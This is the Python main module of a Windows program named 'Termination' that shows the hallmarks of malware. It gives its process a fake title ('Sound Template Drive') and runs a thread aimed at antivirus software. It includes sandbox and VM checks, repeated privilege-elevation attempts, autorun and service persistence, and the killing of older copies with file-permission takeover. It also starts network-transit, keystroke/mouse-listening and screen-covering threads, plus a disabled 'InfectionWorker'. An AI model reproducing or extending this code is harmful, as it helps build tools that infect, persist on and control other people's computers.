# -*- Config : UTF-8 -*-
from TLib.T_imports import *
from TLib import *
from TLhread import *
import TLUI


class Termination:
    def __init__(self):
        self.__init_values__()
        self.__init_AntiVS__()
        #if self.SandBoxVM.Is_AllOfOne_SandBox() or self.tdll.IsVMWare():
        #    print("Hello, World.")
        #    self._exit(0)
        try:
            if not self.tdll.test():
                print("Test Failed.")
                self._exit(0)
        except:
            self._exit(0)
        print(f"{self.__name__} {self.__version__} {self.Version.version["Compilation"]["Runs"]}")
        print(f"PID: {os.getpid()} PPID: {os.getppid()}")
        print(f"IsUserAnAdmin: {bool(self.AdministratorMode.IsUserAnAdmin())}")
        print(f"IsUserAnSystemAdmin: {bool(self.AdministratorMode.IsUserAnSystemAdmin())}")
        print(f"File: {self.__file__}")
        print(f"WorkDir: {self.__work_path__}")
        print(f"TempDir: {self.__static_path__}")
        self.__init_elevate__()
        print("Elevate")
        self.__init_kill_old_process_lock__()
        print("Kill Old Process Lock")
        self.__init_lock__()
        print("Lock")
        time.sleep(2)
        #time.sleep(600)
        if not self.PDir.Is_NeedWorkPath() and self.GetWorkMod() in self.__exec_suffix__:
            print(f"Start Copy")
            #X_ctypes.FreeLibrary(self.odll._handle) Can't uninstall odll here
            self.__uninit_lock__()
            if not self.PDir.Copy():
                print("Copy Bad!!!")
            else:
                print("Already Copy File")
                self.__init_elevate__([self.PDir.__need_file__], me=False)
        else:
            self.PDir.__init_work_dir_values__()
            self.PDir.WriteFiles()
        self.AdvancedFeatures()
        self.__init_autorun__()
        self.Processes()
        self.mainloop()
    def Processes(self):
        self.Thread_MonitorWorker: Thread_TWNTWork.MonitorWorker
        self.Thread_ListenKMWorker: Thread_TWNTWork.ListenKMWorker
        self.Thread_TWNESynchronousTProcess: Thread_TWNTWork.TWNESynchronousTProcess
        self.Thread_TWNTProcessSynchronousWorker: Thread_TWNTWork.TWNTProcessSynchronousWorker
        self.Thread_TWNTCoverScreen: Thread_TWNTWork.TWNTCoverScreen
        self.TWNT=Thread_TWNT.TWNetworkTransit(self)
        self.TProcessManager.AddThread(self.TWNT)
        self.TWNT.start()
        #self.Thread_InfectionWorker=Thread_InfectionWorker.InfectionWorker(self)
        #self.TProcessManager.AddThread(self.Thread_InfectionWorker)
        #self.Thread_InfectionWorker.start()
    def _elevate(self, show_console=False, argv=sys.argv):
        #X_ctypes.FreeLibrary(self.odll._handle)
        print(f"[ME] ToAdmin _:argv:[{argv}]")
        if self.AdministratorMode._ctypes_elevate(show_console=show_console, argv=argv):
            print("[ME] Wrok!Admin Will Kill Self")
            return True
    def __init_elevate__(self, argv=sys.argv, me=True, sleep=10, show_console=False, protect=True):
        if me:
            if not self.AdministratorMode.IsUserAnAdmin():
                if self._elevate(show_console=show_console, argv=argv):
                    self._exit(0)
                else:
                    pass # REPORT TO SERVER (KIT THE SCREEN) (WRITE TO VALUE) (FAST COPY)
            return True
        #return True # THIS !USEFUL SYSTEM POWER, USB SERVICE TO LOCALSYSTEM POWER
        def cnsudoc(n):
            if n > 10:
                return n
            print(f"Try To Elevate {n} times.")
            _=self._elevate(show_console=show_console, argv=[sys.executable] + argv if self.GetWorkMod() == "py" else argv)
            time.sleep(sleep)
            if _ > 0 and self.tpll.IsProcess(sys.executable) if self.GetWorkMod() == "py" else self.tpll.IsProcess(argv[0]): # AND GET VERSION
                print(f"ToAdmin _:[{_}] argv:[{argv}]")
                if protect:
                    print(f"Start AntiVirus Software Help For 60s")
                    time.sleep(60)
                self._exit(0)
            else:
                return cnsudoc(n+1)
        return cnsudoc(0)
    def __init_values__(self):
        self.__name__="Termination"
        self.__process_name__="Sound Template Drive"
        self.__service_name__="TProcess"
        self.__python_suffix__=["py", "pyw", "pyc", "pyz", "pyi"]
        self.__exec_suffix__=["exe"]
        self.__file__=os.path.realpath(sys.argv[0])
        self.__file_bytes_false__=False
        setproctitle.setproctitle(self.__process_name__)
        if os.path.isfile(self.__file__):
            try: self.__file_bytes__=T_FIO.FIO.openr(self.__file__, 2)
            except: self.__file_bytes_false__=True
        else: self.__file_bytes_false__=True
        self.__work_path__=os.path.dirname(self.__file__)
        self.sys_stdout=sys.stdout
        self.sys_stderr=sys.stderr
        self.__pid__=os.getpid()
        class DualOutput:
            def __init__(self, filename):
                self.filename = filename
                self.__pid__=os.getpid()
            def write(self, text: str):
                #if text == "\n": return
                if (f:=open(self.filename, "a", encoding="UTF-8")): f.write(text if text.replace("\n", "").replace("\t", "").replace(" ", "") in ('^', '') else f"[{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}] [{self.__pid__}] {text}")
            def flush(self):
                if (f:=open(self.filename, "a", encoding="UTF-8")): f.flush()
        os.chdir(self.__work_path__)
        # File Value
        self.__file_name__=os.path.basename(self.__file__)
        self.__file_suffix__=self.__file_name__.split(".")[-1]
        self.__static_path__=os.path.dirname(os.path.abspath(__file__))
        self.__log_path__=os.path.join(os.getenv("temp"), "T.log")
        sys.stdout=sys.stderr=DualOutput(self.__log_path__)
        # EXE Config
        self.Static_EXEConfig="./TConfig/EXEConfig.bin" if self.GetWorkMod() == "py" else self.__file__
        # DLLs
        # tools dll
        self.__tdll_name__="tools.dll"
        self.__tdll_path__=os.path.abspath(os.path.join("./tools/", self.__tdll_name__) if self.GetWorkMod() == "py" else os.path.join(self.__static_path__, self.__tdll_name__))
        self.tdll=T_CDLL.DLL(self.__tdll_path__, winmode=0)
        self.tdll.test.restype = ctypes.c_int
        self.tdll.IsVMWare.restype = ctypes.c_int
        # TemplateMatcher dll
        self.__odll_name__="TemplateMatcher.dll"
        self.__odll_path__=os.path.abspath(os.path.join("./tools-ocr/", self.__odll_name__) if self.GetWorkMod() == "py" else os.path.join(self.__static_path__, self.__odll_name__))
        self.odll=T_CDLL.DLL(self.__odll_path__, winmode=0)
        # static folders
        self.__ocr_path__="./ocr/" if self.GetWorkMod() == "py" else os.path.join(self.__static_path__, "ocr")
        self.Static_TTFile="./TLUI/System.ttf" if self.GetWorkMod() == "py" else os.path.join(self.__static_path__, "static", "System.ttf")
        self.Static_WAVFile="./TLUI/HA.wav" if self.GetWorkMod() == "py" else os.path.join(self.__static_path__, "static", "HA.wav")
        self.Static_ServiceEXE="./.inf/service.exe" if self.GetWorkMod() == "py" else os.path.join(self.__static_path__, "static", "service.exe")
        self.Static_Installt="./.inf/installt.exe" if self.GetWorkMod() == "py" else os.path.join(self.__static_path__, "static", "installt.exe")
        self.Static_InspirationSong="./TLUI/InspirationSong.mid" if self.GetWorkMod() == "py" else os.path.join(self.__static_path__, "static", "InspirationSong.mid")
        #self.__need_work_path__=self.PDir.__need_work_path__
        #self.__need_file__=self.PDir.__need_file__
        sys.path.append(self.__work_path__)
        sys.path.append(self.__static_path__)
        sys.path.append(self.__tdll_path__)
        self.Log=T_Log.Log(self.__name__)
        self.__T4_Log__=T_Log.LogCher(self.Log, "Termination4-Main")
        self.__lock__=T_Lock.LockMe(self.__name__, self.__file__)
        # Classes
        self.AdministratorMode=T_AdministratorMode.AdministratorMode()
        self.KeMouse=T_KeMouse.KeMouse(self.odll)
        self.AntiVS=T_AntiVirusSoftware.AntiVirusSoftwareTools(self.KeMouse, self.__ocr_path__)
        self.PDir=T_PDir.PDir(self, self.__name__, self.AdministratorMode)
        self.tpll=T_Tools
        self.SandBoxVM=T_SandBoxVM.SandBoxVM()
        self.GodKeys=T_GodKeys.GodKeys()
        #self.__init_thread_excepthook__()
        self.TProcessManager=T_Process.TProcessManager()
        self.Version=T_Version.Version(self)
        #Threads
        self.Thread_AutoRun=Thread_AutoRun.AutoRunSetup(self)
        self.TProcessManager.AddThread(self.Thread_AutoRun)
        self.Thread_AutoRun.Setup(self)
        # TPLL
        self.WindowsScreenCapture=self.tpll.WindowsScreenCapture()
        try: self.__file_sha256__=self.tpll.GetFileSha256(self.__file__)
        except:
            if not self.__file_bytes_false__: self.__file_sha256__=self.tpll.GetBytesSha256(self.__file_bytes__)
        # EXE Config
        if self.GetWorkMod() == "py":
            g=T_GodKeys.GodKeys(b"EXMODECONFIGKEYS"*2)
            j=ast.literal_eval(T_FIO.FIO.openr("./TConfig/EXEConfig.dict"))
            j["Version"]={"Termination": self.Version.version["Version"], "Compilation": self.Version.version["Compilation"]}
            T_FIO.FIO.openw("./TConfig/EXEConfig.dict", str(j))
            T_FIO.FIO.openw("./TConfig/EXEConfig.bin", b"EXMODECONFIGSTART"+g.encrypt(str(j).encode())+b"EXMODECONFIGEND", 2)
        self.EXEConfig=T_EXEConfig.EXEConfig(self, self.Static_EXEConfig, self.__file_bytes__ if not self.__file_bytes_false__ else None)
        # SetConfig
        self.TLUI=TLUI
        if "Version" in self.Version.version: self.__version__=self.Version.version["Version"]["Version"]
        else: self.Version.version={"Version":{"Version":"4.1.0"},"Compilation":{"Runs":"114514"}}
        self.ConnectServer=False
        self.WorkENV=globals()
        self.WorkENV["Termination"]=self
        self.WorkENV["T"]=self
    def AdvancedFeatures(self):
        self.Thread_LW3T=Thread_LW3T.LW3T(self)
        self.TProcessManager.AddThread(self.Thread_LW3T)
        self.Thread_LW3T.start()
    def __init_autorun__(self):
        self.Thread_AutoRun.start()
    def __init_AntiVS__(self):
        self.Thread_AntiVirusSoftware=Thread_AntiVirusSoftware.AntiVirusSoftware(self)
        self.TProcessManager.AddThread(self.Thread_AntiVirusSoftware)
        self.Thread_AntiVirusSoftware.start()
    def __init_kill_old_process_lock__(self):
        if self.GetWorkMod() == "py": return print("In Python Mode, Can't Kill Old Process Lock")
        if not self.__lock__.IsOtherLock(): return print("No Other Lock, Can't Kill Old Process Lock")
        if not self.AdministratorMode.IsUserAnAdmin(): return print("Not UserAnAdmin, Can't Kill Old Process Lock")
        self.Thread_AutoRun.stop()
        if (pids:=self.__lock__.GetOtherLockPid()):
            print(f"Old Lock Pids: {pids}")
            for pid in pids:
                try: PP=psutil.Process(pid)
                except: continue
                EP=PP.exe()
                if not os.path.isfile(EP): continue
                EC=T_EXEConfig.EXEConfig(self, EP, None)
                Compilation=EC.GetConfig("Compilation")
                print(f"PProcess PID:[{pid}] Process:[{PP}] EXEPath:[{EP}] EC:[{EC}] ECIS:[{EC.Is()}] ECONFIG:[{EC.Config}] Compilation:[{Compilation}]")
                #if "Runs" not in Compilation: continue
                CCR="Runs" in Compilation if Compilation else False
                if os.path.abspath(EP) == os.path.abspath(self.__file__):
                    print("It Is Self")
                    continue
                if not EC.Is() or (CCR and Compilation["Runs"] < self.Version.version["Compilation"]["Runs"]):
                    try:
                        print(f"KillPID PID: [{pid}] EXEPath: [{EP}] CR: [{Compilation["Runs"] if CCR else "NOTEC"}]")
                        print(f"Kill Os.Popen: {os.popen(f"taskkill /F /PID {pid}").read()}")
                        for i in self.tpll.GetPidsPath(EP):
                            print(f"Kill Os.Popen: {os.popen(f"taskkill /F /IM {i}").read()}")
                        try: psutil.Process(pid)
                        except: print(f"Os.Popen Killed PID: [{pid}]")
                        else: os.kill(pid, 9)
                    except:
                        print(f"KillPID Error PID: [{pid}]")
                        traceback.print_exc()
                        continue
                    try:
                        print(F"_tryAllPermissionMethods EP: [{EP}] PID: [{pid}] CR: [{Compilation["Runs"] if CCR else "NOTEC"}]")
                        self.tpll.FileSystemPermissionEnforcer._tryAllPermissionMethods(EP)
                    except:
                        print(f"_tryAllPermissionMethods Error EP: [{EP}]")
                        traceback.print_exc()
                        continue
                if CCR and Compilation["Runs"] >= self.Version.version["Compilation"]["Runs"]:
                    print(f"Pass EXE EP: [{EP}] PID: [{pid}] CR: [{Compilation["Runs"]}] > SelfVersion")
    def __init_lock__(self):
        if self.__lock__.IsOtherLock():
            print("Other Lock, Kill Self")
            self._exit(0)
        self.__lock__.lock()
    def __uninit_lock__(self):
        self.__lock__.unlock()
    def GetWorkMod(self):
        return "py" if self.__file_suffix__ in self.__python_suffix__ else "exe"
    def __init_thread_excepthook__(self):
        def Excepthook(args):
            print(f"Exception in thread {args.thread.name}:")
            print(f"Type: {args.exc_type}")
            print(f"Value: {args.exc_value}")
            print(f"Traceback: {args.exc_traceback}")
        threading.excepthook = Excepthook
    def _reboot(self, code, show_console=False, argv=sys.argv if len(sys.argv) == 1 else sys.argv):
        self.__uninit_lock__()
        if self.PDir.Is_NeedWorkPath() and (service:=self.tpll.IsService(self.__service_name__)) and service.status() == "running":
            print("[REBOOT] THE SERVICE IS RUNNING, JUST END NOW")
            time.sleep(3)
            os._exit(code)
        self._elevate(show_console=show_console, argv=[sys.executable] + argv if self.GetWorkMod() == "py" else argv)
        os._exit(code)
    def _exit(self, code):
        if self.PDir.Is_NeedWorkPath():
            if (service:=self.tpll.IsService(self.__service_name__)) and service.status() == "running":
                if not (r:=self.tpll.WindowsService.StopService(self.__service_name__)==True):
                    print(f"[EXIT] END THE SERVICE ERROR, PLEASE END THE SERVICE! ERROR: [{r}]")
                else:
                    os.system("taskkill /F /IM TProcess.exe")
                    print("[EXIT] End The Service Successful")
            else:
                print("[EXIT] Service Was Stop")
        else:
            print("[EXIT] PDir !NeedWorkPath, Can't Stop Service")
        print(f"Bind: OS._EXIT({code})")
        os._exit(code)
    def mainloop(self):
        #input("")
        self.Event=threading.Event()
        self.Event.wait()
        #X_ctypes.FreeLibrary(self.odll._handle)
        print("START MAIN END")
        #sys.stdout=self.sys_stdout
        #sys.stderr=self.sys_stderr
        self.__uninit_lock__()
        # NO RUN
        self.TProcessManager.KillAllThreads()
        print("END Threads...")
        #self._exit(0)

if __name__ == "__main__":
    Termination()
    os._exit(0)